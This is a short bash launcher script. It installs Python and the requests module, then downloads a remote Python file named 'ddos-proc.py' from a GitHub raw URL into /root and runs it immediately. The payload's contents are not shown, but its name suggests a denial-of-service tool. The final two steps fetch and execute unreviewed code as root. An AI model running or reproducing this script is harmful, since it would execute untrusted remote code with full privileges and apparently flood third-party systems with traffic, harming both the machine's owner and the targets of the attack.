#!/bin/bash

set -e

echo "[INFO] Updating packages..."
apt update -y

echo "[INFO] Installing Python3, pip, and dependencies..."
apt install -y \
    python3 \
    python3-pip \
    python3-venv \
    curl

echo "[INFO] Installing Python requests module globally..."
python3 -m pip install --break-system-packages --upgrade pip requests

echo "[INFO] Downloading Python script..."
curl -L \
https://raw.githubusercontent.com/LakshyaTheMinecrafter/skript.sh/refs/heads/main/ddos-proc.py \
-o /root/ddos-proc.py

echo "[INFO] Running script..."
python3 /root/ddos-proc.py
